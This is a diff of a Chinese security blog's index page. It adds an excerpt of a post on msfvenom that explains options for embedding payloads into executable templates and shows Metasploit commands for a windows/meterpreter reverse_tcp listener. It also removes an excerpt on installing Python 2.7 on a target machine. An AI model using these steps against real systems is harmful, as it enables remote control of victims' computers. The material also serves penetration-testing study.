@@ -395,6 +395,38 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/03/08/msfvenom-advanced/">
+                msfvenom 进阶
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-03-08</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/msfvenom/">msfvenom</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>0x01 msfvenom 常规选项用途:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">l  列出所有可用的payload,编码器,空指令……</span></div><div class="line">-<span class="ruby">p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</span></div><div class="line">-<span class="ruby">f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式</span></div><div class="line">-<span class="ruby">e  指定要使用那种编码器</span></div><div class="line">-<span class="ruby">i  指定编码的次数,如果使用编码器</span></div><div class="line">-<span class="ruby">b  指定坏字符,比如空字符截断问题,等等……</span></div><div class="line">-<span class="ruby">x  使用一个自定义可执行程序模板,并将payload嵌入其中</span></div><div class="line">-<span class="ruby">k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</span></div><div class="line">-<span class="ruby">o  指定创建好的payload的存放位置</span></div></pre></td></tr></table></figure></p>
+<p>0x02 创建最普通的tcp监听器,务必注意,创建什么类型的payload就要用什么类型的监听器来接收<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler</div><div class="line">msf &gt; <span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></div><div class="line">msf <span class="comment">&gt; set lport 443</span></div><div class="line">msf <span class="comment">&gt; set lhost 192.168.3.12</span></div><div class="line">msf <span class="comment">&gt; exploit -j</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/03/08/msfvenom-advanced/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/01/31/tcpdump-sniffer-pass/">
                 linux下的嗅探实践 [tcpdump篇]
             </a>
@@ -579,38 +611,6 @@
 <p><img src="/img/linux_perl.png" alt="&#39;&#39;"><br><br>
         </div>
         <a href="/2016/09/27/revese-shell/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/26/install-py27-on-centos/">
-                快速编译安装配置 py2.7 & jdk 1.7
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-26</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/python/">python</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;有时迫于无奈,我们需要在目标机器上安装一些自己的工具环境,尤其是linux(默认python版本是2.6.6的,现在有些脚本已经很难跑起来),至于win,其平台下的工具已经非常丰富了,这里就不说了</p>
-<p>0x02 编译安装python2.7:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum groupinstall "Development tools" -y</span></div><div class="line"><span class="comment"># yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel -y</span></div><div class="line"><span class="comment"># wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># tar xf Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># cd Python-2.7.11</span></div><div class="line"><span class="comment"># ./configure --prefix=/usr/local</span></div><div class="line"><span class="comment"># make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># python2.7</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; import sys</div><div class="line"><span class="meta">&gt;&gt;</span>&gt; sys.version</div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/26/install-py27-on-centos/" class="read-more">Read More</a>
     
 
 </div>
